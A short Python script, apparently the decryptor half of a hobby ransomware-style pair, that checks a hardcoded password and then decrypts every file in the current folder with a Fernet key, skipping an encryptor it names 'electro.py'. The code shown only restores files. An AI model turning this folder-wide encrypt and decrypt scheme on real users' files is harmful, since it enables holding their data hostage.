import os
from cryptography.fernet import Fernet
files = []

for file in os.listdir():
        if file == "electro.py" or file == "key.key" or file== "decrypt.py":
                continue
        if os.path.isfile(file):
                files.append(file)

print(files)    

pepe = "pepeisking"
status = input("enter the key: ")

if status == pepe:
    with open("key.key", "rb") as thekey:
            secretkey = thekey.read()
    for file in files:
            with open(file, "rb") as thefile:
                    contents = thefile.read()
            contents_dencrypt = Fernet(secretkey).decrypt(contents)
            with open(file, "wb") as thefile:
                    thefile.write(contents_dencrypt)

else:
    print("pepe needs correct key!")


